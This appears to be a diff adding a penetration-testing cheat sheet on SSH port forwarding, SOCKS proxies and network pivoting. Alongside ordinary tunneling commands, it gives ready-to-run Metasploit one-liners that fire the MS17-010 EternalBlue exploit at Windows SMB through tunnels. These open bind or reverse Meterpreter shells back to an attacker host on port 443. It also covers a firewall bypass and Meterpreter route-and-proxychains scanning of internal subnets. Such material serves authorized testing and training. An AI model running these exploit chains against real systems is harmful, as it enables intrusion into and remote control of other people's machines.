@@ -1,0 +1,82 @@
+## Local Port Forwarded towards SSH Server (-L)
+ ssh -p 22 USER@REMOTEA -L 127.0.0.1:PORT:127.0.0.1:PORTA
+Instructs computer to send any traffic that hits your machine’s port (PORT) to the remote computer’s port (PORTA) running on its localhost interface
+
+## Local Port Forwarded towards New Target (-L)
+ ssh -p 22 USER@REMOTEA -L 127.0.0.1:PORT:INTERNAL-TARGET:PORTA
+Instructs computer to send any traffic that hits your machine’s port (PORT) towards a target machine accessible from the SSH server.
+
+## SSH ProxyJump (-J)
+ ssh -J USER@REMOTEA:PORTA,USER@REMOTEB:PORTB USER@REMOTEC:PORTC 
+Instructs computer to connect to SSH service on remote machine REMOTEC, but first tunnels traffic through two other remote machines, REMOTEA and REMOTEB. Multiple jumps can be specified by adding more hosts separated by a comma.
+
+## RDP over SSH Tunnel (-L)
+ ssh -p22 USER@REMOTEA -L 127.0.0.1:PORT:WINDOWS-TARGET:3389 
+Instructs computer to connect to RDP port on target Windows machine accessible via SSH server.
+
+## Exploiting MS17-010 over SSH (-L)
+sudo ssh -p22 USER@REMOTEA -L LOCALPORT1:WIN-TARGET:445 \
+-L 135:WIN-TARGET:135 -L LOCALPORT2:WIN-TARGET:PAYLOAD-PORT
+
+Instructs the machine to set up access to three ports on target machine through an SSH server: a) port 445 for exploitation, b) port 135 for verifying the Windows target’s architecture via RPC querying, and c) payload listening port (ideally same port number as LOCALPORT2). The third port can be any high number port (like 50000+ high).
+
+Afterwards, correctly setup the exploit to connect to the ports locally accessible on your machine. Here’s an example with Metasploit, unfortunately with a bind shell.
+
+msfconsole -x “setg rhosts 127.0.0.1; use windows/smb/ms17_010_eternalblue; set rport <LPORT1>; set payload windows/x64/shell_bind_tcp; set lport <PAYLOAD-PORT>; set ForceExploit true; run”
+
+## Remote Port Forward Listening on Server (-R)
+ ssh -p22 USER@REMOTEA -R SERVER-IP:REMOTEPORT:127.0.0.1:LOCALPORT
+
+Instructs SSH server to redirect traffic that hits a port on that server to port on your own computer. Since server may have multiple network adapters, need to specify the IP address.
+
+[note]: Prior to running these commands, recheck the SSH configuration file on local machine. add "GatewayPorts clientspecified" to the /etc/ssh/sshd_config file & restart the service.
+
+## MS17-010 Firewall Bypass via Port 443 (-R)
+sudo ssh -p22 root@REMOTEA -L LPORT1:REMOTEB:445 -L 135:REMOTEB:135 
+-R REMOTEA:443:127.0.0.1:LPORT2
+
+Instructs SSH server to redirect traffic meant for port 443 on server to port on local machine. Port 445 & 135 belonging to a target Windows machine are both accessible from two ports on local machine.
+
+Root needed to get remote port forwarding for port 443 on SSH server. Remote port used for payload callback. Afterwards, can exploit using Metasploit, this time with a reverse TCP shell :)
+
+msfconsole -x “setg rhosts 127.0.0.1; use windows/smb/ms17_010_eternalblue; set rport <LPORT1>; set payload windows/x64/reverse_tcp; set lhost <SERVER-IP>; set lport 443; set DisablePayloadHandler true; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 127.0.0.1; set LPORT <LPORT2>; set ForceExploit true; run”
+
+## Dynamic SOCKS Proxy (-D)
+[note]: Prior to running these commands, install proxychains-ng: sudo apt install -y proxychains4
+Also: default port for SOCKS proxy is 9050. Can modify in the config file at /etc/proxychains.conf
+>> Big Note: SSH local port forward may be preferred over proxy, due to network latency issues.
+    • SOCKS proxy: ssh -p 22 USER@SERVER -D 127.0.0.1:9050
+    • Proxychains: proxychains4 nc <TARGET-IP> <PORT>
+
+## Sharing Port Forwards & SOCKS Proxies
+Hey, want to let other people use your tunnels. Go for it. Make sure IP set to match network adapter.
+    • Local port forwarding: ssh USER@SERVER -L LOCAL-IP:LPORT:RHOST:RPORT
+    • Dynamic SOCKS: ssh USER@SERVER -D LOCAL-IP:9050
+
+## Metasploit SOCKS Proxies
+Do this after getting Meterpreter session!
+
+background
+route add INTERNAL-SUBNET TARGET-GATEWAY SESSION NUMBER
+route print
+use auxiliary/server/socks4a
+set SRVHOST 127.0.0.1
+set SRVPORT 9050
+run
+jobs
+route example: route add 10.0.0.0 255.255.255.0 1
+
+NOW! Able to use ProxyChains :)
+proxychains nmap <OPTIONS> <TARGET-IN-SUBNET>
+
+## Doing Remote Exploit… Locally!
+Let’s say have a Meterpreter session with low level user access to a Windows box. It’s vulnerable to EternalBlue, but a firewall blocks incoming SMB traffic. Boo-hoo :(
+
+But! Port forwarding to the rescue :) Set it up so local port forwarding from Kali to target machine.
+
+portfwd add -L 127.0.0.1 -l 9445 -r 127.0.0.1 -p 445
+portfwd add -L 127.0.0.1 -l 135 -r 127.0.0.1 -p 135
+
+Now configure Metasploit exploit to run using that local port 9445 & to call back at port 443 on Kali.
+
+msfconsole -x “setg rhosts 127.0.0.1; use windows/smb/ms17_010_eternalblue; set rport 9445; set payload windows/x64/meterpreter/reverse_tcp; set lhost <KALI-IP>; set lport 443; set DisablePayloadHandler true; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <KALI-IP>; set LPORT 443; set ForceExploit true; run”
